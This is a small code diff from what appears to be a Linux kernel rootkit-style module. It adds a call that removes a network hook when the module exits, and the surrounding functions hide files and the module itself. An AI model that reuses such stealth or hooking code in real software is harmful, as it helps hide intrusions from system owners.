@@ -393,6 +393,7 @@ int unhide_file(const char *path_name) {
 }
 
 void MRK_exit(void) {
+    MRK_exit_nethook();
     unhide_module();
 	printk(KERN_INFO "Goodbye, World!\n");
 }
